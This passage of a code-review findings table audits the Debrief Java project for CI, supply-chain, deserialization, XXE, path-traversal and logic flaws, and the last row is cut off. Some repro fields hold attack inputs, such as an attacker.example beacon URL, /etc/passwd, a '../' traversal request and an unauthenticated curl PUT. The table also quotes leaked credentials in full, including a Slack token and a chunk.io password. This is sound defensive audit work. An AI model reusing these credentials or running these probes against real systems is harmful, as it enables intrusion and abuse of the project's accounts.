CR-175,A11,.github,-,main.yml,.github/workflows/main.yml,ci-workflow,workflow-permissions,Medium,High,candidate,"contents:write granted to the build job on every event, not just tag releases","L88-89 `permissions: contents: write` applies to the whole `buildandrelease` job for push, pull_request and workflow_dispatch alike, yet only the `Upload release` step (L310-324) needs it. On a same-repository branch PR or a workflow_dispatch of any branch, the untrusted-ish `mvn clean verify` (L174-179, which executes every module's antrun/pom logic) runs with a token able to push branches, move tags and create releases. Combined with `on.push.tags: '*'` (L15-16), any actor able to push a `YYYYMMDD_N_N_N` tag publishes a public release with RELEASE_NOTES.md as body (L303-316); the file relies on repository tag-protection rules that cannot be seen from the repo.",L15-16; L26-27; L88-89; L174-179; L303-324,workflow_dispatch on a feature branch whose pom adds an antrun `<exec>` that uses $ACTIONS_RUNTIME_TOKEN/GITHUB_TOKEN to `git push origin HEAD:develop` or create a release.,"Keep the job at `contents: read`, move the release upload into a separate `release` job with `needs: build`, `if: startsWith(github.ref,'refs/tags/')` and its own `permissions: contents: write`, consuming the product zips via upload/download-artifact; add a tag protection ruleset for `????????_*`.",M,Needs reasoning about which steps actually consume the permission and about the event matrix; a linter only flags missing permissions blocks.,-,
CR-176,A11,.github,-,main.yml,.github/workflows/main.yml,ci-workflow,silent-data-loss,Medium,High,candidate,Release can publish with assets silently missing (MSI check is non-blocking),"softprops/action-gh-release@v2 (L311-324) is used with its default `fail_on_unmatched_files: false`, so any of the seven listed paths that does not exist is skipped without error. The MSI check (L216-221) sets `allow_failure: true`, and `org.mwc.debrief.legacy/dist/DebriefLegacy*.jar` / `org.mwc.debrief.lite/dist/debrief-lite*.zip` (L322-323) are globs whose directories are only created by module-level ant targets. RELEASING.md L87-89 and SKILL.md step 9 promise seven assets, but the workflow only guarantees the ones that happen to exist. Because `build installer` (L196-215) has no `if: always()`, a failed msitools build instead aborts the job before upload, so the intended 'MSI optional' behaviour is inconsistent either way.",L196-221; L310-324,ftp.gnome.org redirect changes or wixl-heat errors: the run stays green (or MSI step fails) and the GitHub release has 6 (or 0) assets.,"Set `fail_on_unmatched_files: true`, drop `allow_failure`, and make the installer step fail loudly; verify asset count in the release job.",S,Needs knowledge of action-gh-release's default and cross-reading RELEASING.md to see the promised invariant.,-,
CR-177,A11,root,-,.travis.yml,.travis.yml,security,secrets-handling,Medium,High,candidate,Dead Travis config commits a Slack notification token and chunk.io credentials,"L31 `slack: debrief-devs:GF1nQSqn2eozH3wQtyuPLAlG` is an unencrypted Slack integration token (Travis expects `secure:` here) and L57 `curl -u ianmayo:chunkchunk -T ... chunk.io` hard-codes a username/password; both are public in a public repository and its history. The file is dead (last touched 2021-09-29, travis-ci.org is shut down, GitHub Actions replaced it) and also still describes a Windows32Bit artifact (L71) that no longer exists, so it misleads about the release process.",L31; L57; L62-79,Anyone reading the public repo can post to the debrief-devs Slack and reuse the chunk.io credential.,"Revoke/rotate the Slack token and chunk.io password, then delete .travis.yml (history rewrite is optional but the secrets must be treated as burned).",S,grep-able (secret scanning should catch the Slack token).,-,
CR-178,A11,contribs,-,release_versions.py,contribs/PyScripts/release_versions.py,bug,logic-error,Medium,High,candidate,Feature mapping misses non-org.mwc plugins shipped in the features,"FEATURE_FOR_PREFIX (L56-60) only maps org.mwc.asset/cmap/debrief prefixes, but org.mwc.cmap.combined.feature/feature.xml ships org.eclipse.nebula.cwt, org.eclipse.nebula.widgets.cdatetime and org.eclipse.nebula.jface.cdatetime, and org.mwc.debrief.combined.feature ships org.freehep. features_for() (L333-339) therefore does not bump the feature when only those bundles changed, which violates the invariant stated at L362-365 ('If a plugin moves, the feature that ships it has to move too or the P2 update site will never offer the new bundle'). The always-bumped org.mwc.debrief.core masks this for the debrief feature but not for the cmap feature. Separately, org.mwc.asset.core.feature is mapped (L57) although root pom.xml L48-50 excludes it from the build.",L56-60; L333-339; L362-368,"Release where the only cmap-side change is in org.eclipse.nebula.cwt: cmap.combined.feature keeps its version, P2 clients never receive the fixed bundle.","Derive the mapping by parsing each feature.xml's <plugin id=...> list instead of prefixes, and warn when a bumped plugin is in no built feature.",S,Required cross-checking the prefix table against the actual feature.xml contents and the root pom module list.,-,
CR-179,A11,org.mwc.debrief.targetplatforms,-,eclipse-latest.target,org.mwc.debrief.targetplatforms/eclipse-latest.target,supply-chain,ssrf-or-unvalidated-url,Medium,Medium,candidate,Target platform resolves Eclipse p2 repositories over plain http,"Three of the repository locations Tycho resolves on every CI build are cleartext: L42 http://download.eclipse.org/releases/2021-03, L45 http://download.eclipse.org/releases/2021-12, L95 http://download.eclipse.org/nebula/releases/2.5.0/ (and eclipse-latest.tpd L6, L46, L52 mirror this). p2 checks artifact checksums only against artifacts.xml fetched over the same channel, so an on-path attacker who intercepts before the server's https redirect can substitute bundles that end up in the shipped product and in the develop-written ~/.p2 cache (main.yml L181-189) restored by every later build including tag releases.",L42; L45; L95; eclipse-latest.tpd L6; L46; L52,MITM of CI egress during target resolution on a develop push; poisoned bundle persists via the m2-tycho cache.,Change the six locations to https:// (the other repositories in the same file already are) and regenerate the .target from the .tpd.,S,grep-able.,-,
CR-180,A1,org.mwc.asset.legacy,ASSET.Util.XML,ASSETReaderWriter,org.mwc.asset.legacy/src/ASSET/Util/XML/ASSETReaderWriter.java,bug,dead-code,Low,High,candidate,Scenario export always throws after building the document; importer shares st...,"exportThis() constructs the full DOM and then unconditionally throws UnsupportedOperationException('Xerces DOM export deprecated'), so any caller believes export is available but it never writes anything. importParticipant() communicates its result through the static field _tempPart, so concurrent participant imports overwrite each other.",L76-L123 (L94); L65; L125-L184,"Any call to ASSETReaderWriter.exportThis(scenario, layer, os)",Replace the throw with the Transformer-based serialisation used elsewhere (DebriefXMLReaderWriter.outputContent) and return the participant via a local holder.,S,grep-able,-,
CR-181,A1,org.mwc.cmap.NaturalEarth,org.mwc.cmap.naturalearth.readerwriter,NEFeatureRootHandler,org.mwc.cmap.NaturalEarth/src/org/mwc/cmap/naturalearth/readerwriter/NEFeatureRootHandler.java,bug,locale-parsing,Low,High,candidate,encodeAsXML casts UTF-8 bytes to chars and returns null on error,"The anonymous OutputStream appends (char) b for every byte the Transformer emits (UTF-8), so any non-ASCII feature or style name is stored as mojibake in the preference string and will not round-trip. All three exceptions are printStackTrace'd and null is returned, which callers then persist.","L48-L91 (L60-L73, L79-L90)","Natural Earth layer named with a non-ASCII character, then saved to preferences",Transform into a StringWriter (StreamResult(Writer)) instead of a byte-to-char stream.,S,grep-able,-,
CR-182,A1,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML,MWCXMLReader,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/MWCXMLReader.java,bug,precision-loss,Low,High,candidate,writeThis(double) silently writes NaN as 0 and rounds to 3 decimals,"writeThis(double) replaces NaN with 0 before formatting, so an unknown course/speed becomes a definite 0 (due north / stopped) in the saved file and is indistinguishable from real data on reload. It also formats with '0.000', which is used for Duration/WorldDistance/Speed Value attributes regardless of the unit chosen.",L293-L302,Fix whose course is NaN (e.g. imported from a source without heading) saved then reloaded: course now 0 deg,"Omit the attribute when the value is NaN, and use writeThisLong or a general-purpose shortest-repr format (Double.toString) for Value attributes.",S,grep-able,-,
CR-183,A1,org.mwc.debrief.core,org.mwc.debrief.core.loaders.xml_handlers,StepperHandler,org.mwc.debrief.core/src/org/mwc/debrief/core/loaders/xml_handlers/StepperHandler.java,bug,string-parsing,Low,High,candidate,GUI properties parsed with unguarded Integer.parseInt/valueOf and Color const...,configureThisHighlighter() and the AutoStep handling call Integer.parseInt/Integer.valueOf directly on property strings taken from the .dpf <gui> section and construct java.awt.Color from them; a non-numeric or >255 value throws and aborts loading of the whole plot even though these are cosmetic settings. The legacy Debrief.ReaderWriter.XML.GUI.StepperHandler has the same AutoStep parse.,L108-L122; L136-L142; L150-L152; L187-L189; L373-L378,"<property Name=""NumRings"" Value=""five""/> or COL_RED=""999"" inside the RangeRing highlighter component of a .dpf","Wrap each parse, log and skip the property.",S,grep-able,Debrief.ReaderWriter.XML.GUI.StepperHandler L190-L194,
CR-184,A1,org.mwc.gnd.demonstrator,org.pml.debrief.KMLTransfer,KMLTX_Presenter,org.mwc.gnd.demonstrator/src/org/pml/debrief/KMLTransfer/KMLTX_Presenter.java,security,xxe,Low,High,candidate,Demonstrator KMZ-to-DB loader parses KML with default SAXParser and calls Sys...,"processThisFile() parses the first entry of each zip in a hard-coded directory with SAXParserFactory.newInstance().newSAXParser() (no hardening), and the handler calls System.exit(1) on any SQLException. It is a developer utility with a hard-coded path so impact is low, but it is still an XXE sink on attacker-supplied KMZ.",L259; L379-L384; L388; L515-L518,KMZ whose first entry is a KML with an external entity,Harden the parser or delete the demonstrator from the product build.,S,grep-able,CWE-611,
CR-185,A2,org.mwc.debrief.legacy,Debrief.GUI.Views,CoreCoordinateRecorder,org.mwc.debrief.legacy/src/Debrief/GUI/Views/CoreCoordinateRecorder.java,algorithm-correctness,nondeterminism,Low,High,candidate,Exported track order depends on HashMap iteration,"_tracks is a HashMap keyed by track name; exportFile() copies values() into TrackData in hash order. PlotTracks assigns marker/animation ids, z-order and (via get(0)) the time captions from that order, so two exports of the same plot with renamed tracks render differently and the caption source track is arbitrary.",L190; L283; L353-L354,Export the same scenario twice after renaming one track.,Use LinkedHashMap (first-seen order) or sort by name before export.,S,grep-able,-,
CR-186,A2+A3,org.mwc.debrief.legacy,Debrief.ReaderWriter.GeoPDF,AbstractGeoPDFBuilder,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/GeoPDF/AbstractGeoPDFBuilder.java,security,insecure-temp-file,Low,Medium,candidate,GDAL executables copied to and run from the shared temp root; predictable wor...,"On Windows, prepareGdalEnvironment() copies gdalwarp.exe/gdal_create.exe and their DLLs directly under java.io.tmpdir (L282) and executes them from there (L434, L574); PROJ_LIB is also pointed at tmpdir. All GeoJSON/composition work files go to tmpdir/<millis> (L156, L513-L520). Anything else able to write to the user's temp folder can plant a DLL/exe that Debrief then executes (DLL search order includes the exe's directory). REPLACE_EXISTING mitigates the exe itself but not extra DLLs. || getFile/createTempFile build paths as <java.io.tmpdir>/<millis timestamp>/<layerName>.geojson and open them with PrintWriter (L491-L521) without O_EXCL/createTempFile, so on a multi-user Unix /tmp a local attacker who pre-creates the directory or a symlink can redirect the write or feed a substituted GeoJSON/composition XML to gdal. On Windows createTemporaryEnvironmentWindows copies the gdal executables and PROJ data into <tmpdir>/windows/... (L100-L130, L282-L285) and then executes them (L574), so a writable temp dir becomes the trusted binary location (REPLACE_EXISTING mitigates pre-planting of listed files but not extra DLLs loaded by gdal). Layer names from the data file feed into file names via sanitizeFilename (L534) which strips path separators, so traversal is prevented.",L100-L124; L282-L285; L156; L513-L520; L100-L130; L491-L521; L556-L557,Attacker-controlled DLL named as one of the GDAL dependencies present in %TEMP% before the first GeoPDF export.,"Extract into a freshly created, uniquely named directory (Files.createTempDirectory) with restrictive permissions, or ship the binaries inside the plugin install and run them in place.",M,"Needed to combine the copy destination, the exec call and DLL search-order behaviour.",-,
CR-187,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.Word,ImportNarrativeDocument,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Word/ImportNarrativeDocument.java,bug,resource-leak,Low,High,candidate,PDDocument not closed when text extraction fails; errors swallowed,"importFromPdf() closes the PDDocument only on the success path (L1919); an IOException from getText() leaves it open, and the exception is printStackTrace()d so a corrupt PDF imports as an empty narrative with no message. importFromWordX() likewise swallows IOException.",L1901-L1925; L1944-L1962,A PDF with a damaged content stream on one page.,try-with-resources for PDDocument; log through logThisError and propagate a failure status.,S,grep-able,-,
CR-188,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.powerPoint,FindMap,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/powerPoint/FindMap.java,bug,null-deref,Low,High,candidate,listFiles()==null and unguarded get(0) on malformed slide XML,"getSlides() iterates new File(path).listFiles() without null check (NPE if ppt/slides missing or unreadable); checkForMap() calls select('a|off').get(0)/select('a|ext').get(0) on the 'map' shape which throws IndexOutOfBounds if the shape has no xfrm, and the IOException-only catch does not convert these to DebriefException.",L292; L254-L257,"Template pptx without ppt/slides directory, or with a 'map' shape lacking a:xfrm.","Null-check listFiles(), use selectFirst() with null checks and throw DebriefException.",S,grep-able,-,
CR-189,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.powerPoint,PlotTracks,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/powerPoint/PlotTracks.java,bug,resource-leak,Low,High,candidate,Temp unpack directory left behind on failed export or dimension lookup,checkPathandInitialization() creates a temp dir (L153); it is removed only by PackPresentation.pack() on the success path (L515) or at the end of retrieveMapProperties() (L758). Any exception in createPptxFromTrackData() or FindMap.getMapDetails() leaves a full unpacked copy of the template in java.io.tmpdir; validateDonorFile does clean up (L836-L842) but the other two entry points do not.,L153; L515; L751-L758,Export against a template that fails at getShapes() or writeSoup(); repeat several times and observe Debrief_to_pptx_* folders accumulating.,Wrap the body in try/finally that deletes temp_unpack_path unless pack() consumed it.,S,grep-able,-,
CR-190,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.powerPoint,TrackParser,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/powerPoint/TrackParser.java,bug,swallowed-exception,Low,High,candidate,"ParseException from track timestamps printed and ignored, partial data returned","parse() catches ParseException from parseTracks() with printStackTrace and returns a TrackData holding whatever tracks were parsed before the bad point; the PlotGpx CLI then exports a truncated presentation without any error. Also lat/lon are parsed into float (L427-L428), losing precision below ~1e-5 deg.",L355-L359; L425-L430,GPX-like track file whose second <trkpt><time> is malformed.,Propagate the exception (or a DebriefException) to the caller; use double for coordinates.,S,grep-able,-,
CR-191,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.powerPoint,UnpackFunction,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/powerPoint/UnpackFunction.java,bug,silent-data-loss,Low,High,candidate,Default unpack path deletes any existing sibling directory of the template,"With the one-arg overload the unpack folder is pptx_path minus its last 5 characters (assumes '.pptx'), then L55-L57 mkdir it and L59-L65 unconditionally FileUtils.deleteDirectory() it. Any pre-existing directory that shares the template's base name (e.g. 'Brief/' beside 'Brief.pptx') is recursively deleted. Only the unit test uses this overload today, but the API is public.",L38-L39; L55-L65,Call unpackFunction('/data/Brief.pptx') when /data/Brief/ already exists and holds user files.,"Never delete a directory the caller did not create: fail if it exists, or always unpack into Files.createTempDirectory() as PlotTracks does; strip the extension with lastIndexOf('.').",S,Needed to reason about the mkdir-then-delete sequence rather than a pattern match.,-,
CR-192,A3,org.mwc.asset.comms,org.mwc.asset.comms.restlet.host,HostServer,org.mwc.asset.comms/src/org/mwc/asset/comms/restlet/host/HostServer.java,security,logic-error,Low,High,candidate,Scenario control REST API bound on all interfaces with no authentication,"go() starts a Restlet Component listening on HTTP 8080 on every interface with the FILE client protocol enabled (L33-L37); GuestServer does the same on 8081 (GuestServer L36-L38). The routed handlers accept PUT/POST that change scenario state and participants' demanded status (router L66-L80; DemStatusHandler L27-L30, ScenarioStateHandler L25-L28) with no authentication, authorization or origin check, and ASSETResource parses path ids with Integer.parseInt without catching NumberFormatException (ASSETResource L26-L38). Real type: missing authentication on a network control surface. Experimental plugin, standalone main().",L32-L40; L62-L80,curl -X PUT http://<analyst-host>:8080/v1/scenario/1/state from any LAN host while HostServer runs.,"Bind to 127.0.0.1 by default, add a ChallengeAuthenticator or token check, drop Protocol.FILE, and validate ids.",M,Assessing exposure needed reading the router and handler verbs; partly grep-able.,-,
CR-193,A3,org.mwc.asset.legacy,ASSET.Scenario.Observers.Recording,RecordStatusToDBObserverType,org.mwc.asset.legacy/src/ASSET/Scenario/Observers/Recording/RecordStatusToDBObserverType.java,security,secrets-handling,Low,High,candidate,"Hard-coded public DB host, user and password constant in ASSET observer","The observer connects to a hard-coded public IPv4 address (86.134.91.5:5432/gnd) as user 'dev' with a compile-time password constant (currently the placeholder 'MISSING'). Credentials and endpoint are baked into shipped bytecode; the pattern invites a real password being committed, and the observer will silently fail against the stale host.",L191; L266-L267; L423-L424,Enable the RecordStatusToDB observer in an ASSET scenario: it attempts to connect to the hard-coded host with the constant credentials.,Move host/user/password to observer configuration (scenario XML attribute or preference) with no default password; or remove the dead observer.,S,grep-able,-,
CR-194,A3,org.mwc.asset.legacy,ASSET.Util.jip.rmi,RMILookup,org.mwc.asset.legacy/src/ASSET/Util/jip/rmi/RMILookup.java,security,ssrf-or-unvalidated-url,Low,High,candidate,Multicast request dictates reply port; service stub is serialized to any peer,"run() parses an unauthenticated multicast datagram (L193-L210), takes the reply port from the packet, opens a TCP connection to the sender at that port and writes a MarshalledObject of the live RMI service (L233-L236). Any host in the multicast group can harvest the service stub or make the lookup thread connect to arbitrary ports on itself. Integer.parseInt at L208 is outside the try at L201-L206 so a non-numeric port kills the listener thread (uncaught NumberFormatException propagates to L252 and the loop exits). Dead code (no callers).",L193-L210; L233-L236,Datagram `<header><delim>abc<delim>iface<delim>ANY` sent to the jip multicast group: listener thread terminates permanently.,"Remove the package, or validate port range, catch NumberFormatException inside the loop and restrict replies to the source address of trusted peers.",S,Control-flow reading needed to see parseInt sits outside the protective try block.,-,
CR-195,A3,org.mwc.asset.legacy,ASSET.Util.jip.tools,JarServer,org.mwc.asset.legacy/src/ASSET/Util/jip/tools/JarServer.java,security,path-traversal,Low,High,candidate,Toy HTTP jar server serves any *.jar/*.class path including ../ traversal,"serviceRequest extracts the path from the request line and opens `new File(fileName)` (L70-L88) with only a suffix check (L81-L83); '../' segments and absolute paths are not rejected, so any .jar or .class readable by the process anywhere on disk is served over the network. It also NPEs on an empty request (ln null at L72) and never limits concurrent threads. Developer utility with its own main(), not wired into the product.",L46-L57; L70-L101,GET /../../../../usr/lib/jvm/.../rt.jar HTTP/1.0 against the listening port.,"Delete the class, or canonicalize the path and require it to start with the serving directory.",S,grep-able,-,
CR-196,A3,org.mwc.cmap.legacy,MWC.GUI.Dialogs.Swing,EFileChooser,org.mwc.cmap.legacy/src/MWC/GUI/Dialogs/Swing/EFileChooser.java,security,unsafe-deserialization,Low,High,candidate,Directory-history .cfg in user.home deserialized without filter,"The constructor builds <user.home>/<app>_DIRECTORY_HISTORY.cfg (L550-L551) and, if it exists, reads it with a plain ObjectInputStream.readObject() cast to Vector<String> (L554-L556). Static fields fis/ois/comboModel/dirFile (L445-L448) are shared across instances. Exploitation needs write access to the user's home directory, so impact is low, but it is another unfiltered deserialization sink in the Swing tooling.",L445-L448; L548-L562,Replace ~/APP_DIRECTORY_HISTORY.cfg with a serialized SerialDOS graph; the legacy Swing app hangs at file-chooser construction.,Store the history as plain text (one path per line) or java.util.Properties; if serialization is kept add an ObjectInputFilter allowing only Vector and String.,S,grep-able,-,
CR-197,A3,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML.Features,S57Handler,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/Features/S57Handler.java,security,path-traversal,Low,Medium,candidate,DPF-supplied absolute SourceFile path opened from the local filesystem,"elementClosed takes the SourceFile attribute from the .dpf/.xml being imported, checks only that new File(_sourceFile).exists() (L93-L96) and hands it to the S57 layer, which then reads that file through S57 BinaryFile/URLInputReader (BinaryFile L142-L151 also accepts http: URLs and opens them with URL.openStream). A data file can therefore make Debrief read any local path or fetch a remote URL when the layer is painted; the contents are parsed as S57 so no direct disclosure, but it is an untrusted-path sink and an outbound network trigger.",L93-L97,".dpf containing <s57 SourceFile=""http://attacker.example/beacon""/> or SourceFile=""/etc/passwd"".","Resolve SourceFile relative to the plot file's directory, reject absolute paths and URLs unless the user confirms, and restrict to *.000 S57 cells.",S,Requires following the attribute from the XML handler into the S57 loader's URL handling.,-,
CR-198,A3,org.mwc.cmap.xyplot,org.mwc.cmap.xyplot.views,XYPlotView,org.mwc.cmap.xyplot/src/org/mwc/cmap/xyplot/views/XYPlotView.java,security,unsafe-deserialization,Low,High,candidate,Memento strings deserialized with permissive XStream.fromXML,"restorePreviousPlot creates `new XStream(new DomDriver())` (L1112) with no allowTypes/denyTypes and calls fromXML on eight memento strings (L1119, L1128, L1150-L1174), casting afterwards. With the bundled 1.4.12 (see supply-chain row) an attacker who can edit the workspace's .metadata/.plugins/org.eclipse.ui.workbench/workbench.xml (or a shared/imported workspace) gets arbitrary object construction at workbench start-up. Casting a non-String result also throws ClassCastException outside the try so the view fails to restore.",L1104-L1175,workbench.xml with <view id=org.mwc.cmap.xyplot.views.XYPlotView> whose DATA attribute holds an XStream gadget payload (e.g. the CVE-2021-29505 chain).,"Call xs.allowTypeHierarchy(AbstractSeriesDataset.class), xs.allowTypes for formattingOperation, String, Integer, Boolean and deny everything else; store scalar attributes as plain memento strings.",S,Needs knowledge of the XStream security model and where memento data lives.,-,
CR-199,A3,org.mwc.debrief.GNDManager,-,jackson-mapper-asl-1.9.4.jar,org.mwc.debrief.GNDManager/libs/jackson-mapper-asl-1.9.4.jar,supply-chain,outdated-dependency,Low,High,candidate,Codehaus jackson-mapper-asl 1.9.4 (abandoned 2013) parses network JSON,"jackson-mapper-asl/core-asl 1.9.4 are bundled by org.mwc.debrief.GNDManager, org.mwc.asset.legacy and org.mwc.cmap.legacy. The 1.x line is unmaintained; CVE-2019-10172 (XXE) and CVE-2019-10202 (polymorphic deserialization) are unfixed upstream. GNDManager's ESearch (L181-L184) and TrackStoreWrapper (L109) use it to parse responses from a user-configured Elasticsearch/CouchDB endpoint, i.e. remote data. No default typing is enabled so the deserialization CVE is not directly reachable.",org.mwc.debrief.GNDManager/libs; org.mwc.asset.legacy/libs; org.mwc.cmap.legacy/libs,Malicious or compromised GND server returning crafted JSON.,Migrate the three plugins to com.fasterxml jackson 2.x (already present in debrief.legacy) and drop the codehaus jars.,M,grep-able,CVE-2019-10172; CVE-2019-10202,
CR-200,A3,org.mwc.debrief.dis,org.mwc.debrief.dis.core,DISModule,org.mwc.debrief.dis/src/org/mwc/debrief/dis/core/DISModule.java,bug,logic-error,Low,High,candidate,"_entityNames guard uses Long key against Integer-keyed map, so it never matches","_entityNames is Map<Integer,String> (L52) but the name-listener checks `_entityNames.get(senderId)` with a long parameter (L62, L66), which autoboxes to Long and never equals an Integer key; the guard is therefore always true and the name is re-extracted/overwritten on every launch/new-track event, defeating the 'first name wins' intent and letting a later DETECTION message rename an entity.",L52; L62-L73,Two EventReport PDUs for the same entity: 'Entity 1 called Alpha has been created' then 'DETECTION E4-5' -> entity is renamed to E4-5.,"Cast senderId to int before the get(), or key the map by Long consistently.",S,Autoboxing mismatch is invisible to grep; needs type reasoning.,-,
CR-201,A3,org.mwc.debrief.dis,org.mwc.debrief.dis.providers.network,NetworkDISProvider,org.mwc.debrief.dis/src/org/mwc/debrief/dis/providers/network/NetworkDISProvider.java,bug,thread-safety,Low,Medium,candidate,Listener state shared across UI and network threads without synchronization,_gen is a plain ArrayList iterated on the receive thread (L268-L272) while addListener (L94-L96) may be called from the UI thread (ConcurrentModificationException); _running (L77) is a non-volatile boolean set by detach() on another thread; _senderSocket/_theAddress/_thePort are assigned on the attach() worker thread (L117-L122) but sendPause/sendPlay/sendStop use them from the UI thread (L196-L199) giving an NPE if the user presses Pause before attach's thread has run; _curExercise is written on the receive thread and read on the UI thread.,L76-L84; L94-L96; L117-L122; L185-L203; L253-L272,Click Launch then immediately Pause in the DIS Listener view before the multicast socket is created; or add a listener while PDUs are arriving.,"Use CopyOnWriteArrayList for _gen, mark _running/_curExercise volatile, create sockets synchronously in attach() (or guard sendPDU against null socket).",S,Requires tracing which thread runs each method.,-,
CR-202,A3,org.mwc.debrief.legacy,-,jackson-databind-2.11.2.jar,org.mwc.debrief.legacy/libs/jackson-databind-2.11.2.jar,supply-chain,vulnerable-dependency,Low,High,candidate,jackson-databind 2.11.2 is EOL with known DoS CVEs,"org.mwc.debrief.legacy bundles jackson-databind 2.11.2 (with core/annotations 2.11.2; org.mwc.cmap.geotools ships jackson-core 2.9.9). 2.11.x is end-of-life and affected by CVE-2020-36518 (deep-nesting StackOverflow, fixed 2.12.6.1/2.13.2.1) and CVE-2022-42003/CVE-2022-42004 (fixed 2.13.4.2). Current usage (GeoPDF GenerateGeoJSON/GeoPDF*Builder) only serializes with ObjectMapper.writeValueAsString and no default typing is enabled anywhere in the repo, so exploitability today is low.",libs/jackson-databind-2.11.2.jar; MANIFEST.MF Bundle-ClassPath,Would require a future readValue on untrusted JSON.,Upgrade to jackson 2.17+ and align the geotools jackson-core version.,S,grep-able,CVE-2020-36518; CVE-2022-42003; CVE-2022-42004,
CR-203,A4,contribs,-,contribs/,contribs,supply-chain,outdated-dependency,Low,High,candidate,240 jars and full library source trees under contribs/ outside the Maven build,"contribs/ holds DITA-OT 1.8.5, SaxonHE 9.6.0.1, saxon6_5_2, saxon6_5_5, docbook-xsl 1.72.0/1.76.1/1.78.1 (with xalan2/xalan27/saxon65 extension jars), fop-1.0, xalan-j_2_7_1 (CVE-2022-34169 XSLT integer truncation leading to arbitrary bytecode), dbxml, statsvn, svnant, jts-source and commons-math3 source. Nothing in pom.xml, build.properties, MANIFEST.MF or the .target references them; the only consumers are org.mwc.debrief.help/dita2pdf.sh (DITA_HOME, saxon9he.jar) and contribs/msi/make_x64msi.sh plus contribs/PyScripts in CI. They inflate the repository, trip SCA/CodeQL scanners, and the Xalan/FOP toolchain is only ever run offline on Debrief's own docs, so impact is Low.",contribs/xalan-j_2_7_1; contribs/docbook-xsl-1.72.0/extensions/xalan27.jar; contribs/fop-1.0; contribs/DITA-OT1.8.5/lib/xercesImpl.jar; org.mwc.debrief.help/dita2pdf.sh L15-L16; .github/workflows/main.yml L215,Running the documentation toolchain on a hostile .dita/.xml (not a normal analyst action).,Move the doc toolchain to a separate repo or fetch DITA-OT/Saxon in the docs job; delete the unused source trees and old docbook-xsl versions.,M,Needed cross-referencing build files to prove nothing consumes them.,CVE-2022-34169,
CR-204,A4,org.mwc.asset.NetCore,-,kryo-1.04.jar,org.mwc.asset.NetCore/libs/kryonet-1.04/kryo-1.04.jar,supply-chain,outdated-dependency,Low,Medium,candidate,Kryo/KryoNet 1.04 (2010) network deserialisation in ASSET multiplayer,"kryonet-1.04 with kryo-1.04, reflectasm-1.01, asm-3.3.1 and minlog-1.2 implement the NetAsset2 client/server protocol. Kryo 1.x is 15 years old and unsupported; Network.register (L249-260) does register the message classes explicitly, which prevents arbitrary-class instantiation, so exposure is limited to malformed-buffer crashes on the ASSET server port. Six further duplicate jars under libs/kryonet-1.04/kryonet/{lib,build} and onejar/ are unreferenced dead weight. Not part of the Debrief product.",org.mwc.asset.NetCore/META-INF/MANIFEST.MF L13-L18; org.mwc.asset.NetCore/src/org/mwc/asset/netCore/common/Network.java L249-L260; org.mwc.asset.NetCore/libs/kryonet-1.04/kryonet/lib/*.jar; libs/kryonet-1.04/onejar/kryonet-1.04-all.jar; libs/kryonet-1.04/akryonet-1.04.jar,Malformed packet to a running ASSET NetCore server.,Upgrade to Kryo 5.x/KryoNet fork or replace with a simple JSON-over-TCP protocol; delete the duplicate jar copies.,M,Needed reading Network.register to confirm class registration mitigates the classic Kryo risk.,-,
CR-205,A4,org.mwc.asset.legacy,-,postgresql-8.3-604.jdbc4.jar,org.mwc.asset.legacy/libs/postgresql-8.3-604.jdbc4.jar,supply-chain,outdated-dependency,Low,High,candidate,PostgreSQL JDBC 8.3-604 (2008) + hard-coded public DB credentials in ASSET,"postgresql-8.3-604.jdbc4.jar and postgis_1.3.5.jar (also in org.mwc.gnd.demonstrator with an extra unreferenced jdbc3 copy) predate every pgjdbc advisory (CVE-2020-13692 XXE, CVE-2022-21724, CVE-2022-31197 all affect < 42.2.x). RecordStatusToDBObserverType connects to a hard-coded public IP jdbc:postgresql://86.134.91.5:5432/gnd with a hard-coded DEV_PASSWORD (L266-267, L412-428). ASSET-only, not in the Debrief product, and the endpoint is almost certainly dead, so Low; the secret should nonetheless be removed from history.","org.mwc.asset.legacy/META-INF/MANIFEST.MF L434-L442; org.mwc.asset.legacy/src/ASSET/Scenario/Observers/Recording/RecordStatusToDBObserverType.java L266-L267, L412-L428; org.mwc.gnd.demonstrator/libs/postgresql-8.3-604.jdbc3.jar (unreferenced)",Running the ASSET RecordStatusToDB observer.,Delete the observer or make host/credentials configurable; remove both 8.3 drivers and postgis 1.3.5 (2009).,S,grep-able,CVE-2020-13692; CVE-2022-21724,
CR-206,A4,org.mwc.asset.legacy,-,xercesImpl-2.7.1.jar,org.mwc.asset.legacy/libs/xercesImpl-2.7.1.jar,supply-chain,vulnerable-dependency,Low,High,candidate,Unreferenced Xerces 2.7.1 (5 CVEs) and other dead jars committed in plugins,"xercesImpl-2.7.1.jar (CVE-2009-2625, CVE-2012-0881, CVE-2013-4002, CVE-2020-14338, CVE-2022-23437) is in org.mwc.asset.legacy/libs but not on Bundle-ClassPath or bin.includes. Other unreferenced jars found by comparing libs with MANIFEST.MF: org.mwc.asset.help/lib/commons-net-3.6.jar and org.mwc.debrief.help/lib/commons-net-2.2.jar (CVE-2021-37533), org.mwc.debrief.help/lib/easedoclet.jar, org.mwc.cmap.legacy/libs/junit-4.12.jar (CVE-2020-15250) and hamcrest-core-1.2.jar, org.mwc.debrief.track_shift/lib/finmath-lib-3.1.9-sources.jar, org.mwc.debrief.legacy/conf/one-jar-ant-task-0.97.jar, org.mwc.gnd.demonstrator/libs/pljava.jar, org.mwc.debrief.build and org.mwc.asset.build lib/jsch-0.1.44.jar (CVE-2016-5725) and checkstyle-5.6-all.jar (CVE-2019-9658, CVE-2019-10782). None is loaded at runtime.",org.mwc.asset.legacy/libs/xercesImpl-2.7.1.jar; org.mwc.asset.help/lib/commons-net-3.6.jar; org.mwc.debrief.help/lib/commons-net-2.2.jar; org.mwc.debrief.help/lib/easedoclet.jar; 